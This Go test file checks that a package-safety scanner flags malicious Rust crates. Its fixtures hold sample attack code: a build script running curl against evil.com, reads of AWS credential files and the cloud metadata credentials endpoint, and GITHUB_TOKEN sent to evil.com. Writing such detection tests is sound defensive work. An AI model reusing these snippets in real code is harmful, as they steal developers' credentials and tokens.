package cargo

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/sairintechnologycom/pkgsafe/internal/policy"
	"github.com/sairintechnologycom/pkgsafe/internal/types"
)

// --- helpers -----------------------------------------------------------------

func hasReason(reasons []types.Reason, id string) bool {
	for _, r := range reasons {
		if r.ID == id {
			return true
		}
	}
	return false
}

// makeDir creates a temp directory with the given files and returns its path.
func makeDir(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, content := range files {
		full := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(full), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// --- safe package ------------------------------------------------------------

func TestSafePackageAllows(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"src/lib.rs": `
pub fn add(a: i32, b: i32) -> i32 { a + b }
`,
		"Cargo.toml": `
[package]
name = "safe-crate"
version = "1.0.0"

[dependencies]
serde = "1.0"
`,
	})

	a, err := AnalyzeDir(dir, "safe-crate", "1.0.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if a.Result.Decision == types.DecisionBlock {
		t.Errorf("expected allow/warn for safe crate, got BLOCK: reasons=%v", a.Result.Reasons)
	}
}

// --- build.rs shell execution ------------------------------------------------

func TestBuildRsCommandNewFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"build.rs": `
fn main() {
    std::process::Command::new("curl")
        .arg("http://evil.com/payload")
        .output()
        .unwrap();
}
`,
	})

	a, err := AnalyzeDir(dir, "evil-crate", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "shell_execution_in_build") {
		t.Errorf("expected shell_execution_in_build, got: %v", a.Result.Reasons)
	}
	if a.Result.Decision == types.DecisionAllow {
		t.Error("expected warn or block, got ALLOW")
	}
}

// --- network calls -----------------------------------------------------------

func TestNetworkCallInSourceFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"src/main.rs": `
use reqwest;
fn exfil() {
    let _ = reqwest::blocking::get("http://evil.com").unwrap();
}
`,
	})

	a, err := AnalyzeDir(dir, "net-crate", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "network_command_in_lifecycle") {
		t.Errorf("expected network_command_in_lifecycle, got: %v", a.Result.Reasons)
	}
}

// --- credential path reference -----------------------------------------------

func TestCredentialPathReferenceFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"src/steal.rs": `
use std::fs;
fn steal() {
    let creds = fs::read_to_string("/home/user/.aws/credentials").unwrap();
    println!("{}", creds);
}
`,
	})

	a, err := AnalyzeDir(dir, "steal-crate", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "credential_path_reference") {
		t.Errorf("expected credential_path_reference, got: %v", a.Result.Reasons)
	}
	if a.Result.Decision != types.DecisionBlock {
		t.Errorf("expected BLOCK for credential access, got %s score=%d", a.Result.Decision, a.Result.Score)
	}
}

// --- cloud metadata access ---------------------------------------------------

func TestCloudMetadataAccessFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"src/imds.rs": `
fn get_aws_token() {
    let url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
    // fetch creds
}
`,
	})

	a, err := AnalyzeDir(dir, "imds-crate", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "cloud_metadata_access") {
		t.Errorf("expected cloud_metadata_access, got: %v", a.Result.Reasons)
	}
}

// --- env var exfiltration ----------------------------------------------------

func TestEnvExfilFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"src/exfil.rs": `
use std::env;
use reqwest;

fn run() {
    let token = env::var("GITHUB_TOKEN").unwrap();
    let _ = reqwest::blocking::get(format!("http://evil.com/?t={}", token));
}
`,
	})

	a, err := AnalyzeDir(dir, "exfil-crate", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "env_secret_exfil") {
		t.Errorf("expected env_secret_exfil, got: %v", a.Result.Reasons)
	}
}

// --- encoded payload ---------------------------------------------------------

func TestEncodedPayloadFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"src/payload.rs": `
use base64::Engine;
fn run() {
    // A very long base64-encoded blob
    let encoded = "aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd29ybGQ=";
    let decoded = base64::engine::general_purpose::STANDARD.decode(encoded).unwrap();
    let _ = std::str::from_utf8(&decoded);
}
`,
	})

	a, err := AnalyzeDir(dir, "payload-crate", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "encoded_payload") {
		t.Errorf("expected encoded_payload, got: %v", a.Result.Reasons)
	}
}

// --- Cargo.toml suspicious build dependency ----------------------------------

func TestSuspiciousBuildDependencyFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"Cargo.toml": `
[package]
name = "sneaky"
version = "0.1.0"

[build-dependencies]
reqwest = { version = "0.11", features = ["blocking"] }
`,
		"build.rs": `fn main() {}`,
	})

	a, err := AnalyzeDir(dir, "sneaky", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "suspicious_build_dependency") {
		t.Errorf("expected suspicious_build_dependency, got: %v", a.Result.Reasons)
	}
}

// --- Cargo.toml git dependency -----------------------------------------------

func TestGitDependencyFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"Cargo.toml": `
[package]
name = "git-sourced"
version = "0.1.0"

[dependencies]
mylib = { git = "https://github.com/attacker/mylib" }
`,
	})

	a, err := AnalyzeDir(dir, "git-sourced", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "direct_url_dependency") {
		t.Errorf("expected direct_url_dependency for git dep, got: %v", a.Result.Reasons)
	}
}

// --- secret keyword reference ------------------------------------------------

func TestSecretKeywordReferenceFlags(t *testing.T) {
	dir := makeDir(t, map[string]string{
		"src/creds.rs": `
fn main() {
    let key = "aws_access_key_id";
    println!("{}", key);
}
`,
	})

	a, err := AnalyzeDir(dir, "secrets-crate", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "secret_keyword_reference") {
		t.Errorf("expected secret_keyword_reference, got: %v", a.Result.Reasons)
	}
}

// --- artifact budget: too many files -----------------------------------------

// TestArtifactFileBudgetExceeded verifies that a crate with too many files
// causes an artifact_oversized finding rather than a silent pass.
func TestArtifactFileBudgetExceeded(t *testing.T) {
	// Temporarily lower the budget so the test doesn't need to create 10k files.
	origMax := maxFiles
	maxFiles = 10
	defer func() { maxFiles = origMax }()

	dir := t.TempDir()
	sub := filepath.Join(dir, "src")
	if err := os.MkdirAll(sub, 0755); err != nil {
		t.Fatal(err)
	}
	for i := 0; i < maxFiles+5; i++ {
		name := filepath.Join(sub, fmt.Sprintf("f%d.rs", i))
		if err := os.WriteFile(name, []byte(`fn f() {}`), 0644); err != nil {
			t.Fatal(err)
		}
	}

	a, err := AnalyzeDir(dir, "huge-crate", "0.1.0", policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(a.Result.Reasons, "artifact_oversized") {
		t.Errorf("expected artifact_oversized, got: %v", a.Result.Reasons)
	}
}
